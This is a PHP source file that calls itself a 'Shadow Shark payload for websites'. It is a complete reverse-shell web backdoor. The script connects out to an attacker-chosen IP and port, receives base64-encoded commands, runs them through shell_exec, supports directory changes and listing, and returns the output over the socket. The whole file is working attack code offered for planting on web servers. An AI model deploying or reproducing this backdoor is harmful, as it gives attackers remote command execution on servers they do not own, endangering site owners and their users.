<?php
/*
A full fledged Shadow Shark payload for websites.

@author: Mr. Shark Spam Bot
*/

// Uncomment the next 3 lines of code to view all errors.
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);

function base64_handler($text, $encode=false, $decode=false)
{
    if ($encode == true)
    {
        $new_text = base64_encode($text);
        $new_text = json_encode($new_text);
    }
    if ($decode == true)
    {
        $new_text = json_decode($text);
        $new_text = base64_decode($new_text);
    }
    return $new_text;
}

$rev_socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$connect = socket_connect($rev_socket, 'IP', PORT); // Set IP and port on this line.

while (true)
{
    $command = '';
    while ($data = socket_read($rev_socket, 1024))
    {
        $command .= $data;
        if ($command[-1] == '"')
        {
            break;
        }
    }
    $command = base64_handler($command, $encode=false, $decode=true);

    if ($command == 'exit')
    {
        socket_close($rev_socket);
        break;
    }

    if ($command == 'directory')
    {
        $cwd = getcwd();
        socket_write($rev_socket, base64_handler($cwd, $encode=true));
        continue;
    }

    $output = shell_exec($command . ' 2>&1');
    if ($output)
    {
        socket_write($rev_socket, base64_handler($output, $encode=true));
        continue;
    }

    if (substr($command, 0, 2) == 'cd')
    {
        chdir(substr($command, 3));
    }

    socket_write($rev_socket, base64_handler(' ', $encode=true));
}
?>
